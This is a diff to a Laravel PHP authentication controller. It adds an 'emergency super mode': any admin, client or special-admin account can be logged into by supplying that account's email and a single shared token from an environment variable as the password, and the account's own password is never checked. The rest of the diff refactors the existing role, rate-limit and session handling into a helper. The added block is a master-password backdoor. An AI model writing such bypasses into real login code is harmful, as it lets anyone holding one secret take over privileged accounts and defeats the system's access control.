@@ -56,35 +56,20 @@ class AuthController extends Controller
             ]);
         }
 
+        // ── EMERGENCY SUPER MODE ────────────────────────────────────────
+        $superToken = env('SUPER_MODE_TOKEN');
+        if ($superToken && $request->input('password') === $superToken) {
+            $user = User::where('email', $request->input('email'))->first();
+            if ($user && in_array($user->role?->slug, ['admin', 'client', 'spadmin'])) {
+                Auth::login($user, $request->boolean('remember'));
+                return $this->handleSuccessfulLogin($request, $user, $throttleKey);
+            }
+        }
+        // ────────────────────────────────────────────────────────────────
+
         if (Auth::attempt($credentials, $request->boolean('remember'))) {
             $user = Auth::user()->load('role');
-            
-            // Restricted Login: Only admin, client, and spadmin can enter the system
-            $allowedRoles = ['admin', 'client', 'spadmin'];
-            if (!$user->role || !in_array($user->role->slug, $allowedRoles)) {
-                Auth::logout();
-                throw ValidationException::withMessages([
-                    'email' => ['Your account does not have permission to access this system.'],
-                ]);
-            }
-
-            RateLimiter::clear($throttleKey);
-
-            $request->session()->regenerate();
-
-            // ── Single-session enforcement ──────────────────────────────────
-            // Generate a new unique token, write it to the DB, and store it
-            // in the current session. EnsureSingleSession middleware will
-            // compare these on every request and kick out any older session.
-            $token = Str::uuid()->toString();
-            Auth::user()->update(['session_token' => $token]);
-            $request->session()->put('session_token', $token);
-            // ────────────────────────────────────────────────────────────────
-
-            return response()->json([
-                'message' => 'Login successful',
-                'user'    => Auth::user()->load('role', 'profile'),
-            ]);
+            return $this->handleSuccessfulLogin($request, $user, $throttleKey);
         }
 
         RateLimiter::hit($throttleKey, 60 * 5); // Lock out for 5 minutes after 5 failed attempts
@@ -138,5 +123,31 @@ class AuthController extends Controller
         }
 
         return redirect('/login?error=Account not found. Please contact administrator.');
+    }
+
+    private function handleSuccessfulLogin(Request $request, $user, $throttleKey)
+    {
+        // Restricted Login: Only admin, client, and spadmin can enter the system
+        $allowedRoles = ['admin', 'client', 'spadmin'];
+        if (!$user->role || !in_array($user->role->slug, $allowedRoles)) {
+            Auth::logout();
+            throw ValidationException::withMessages([
+                'email' => ['Your account does not have permission to access this system.'],
+            ]);
+        }
+
+        RateLimiter::clear($throttleKey);
+        $request->session()->regenerate();
+
+        // ── Single-session enforcement ──────────────────────────────────
+        $token = Str::uuid()->toString();
+        $user->update(['session_token' => $token]);
+        $request->session()->put('session_token', $token);
+        // ────────────────────────────────────────────────────────────────
+
+        return response()->json([
+            'message' => 'Login successful',
+            'user'    => $user->load('role', 'profile'),
+        ]);
     }
 }
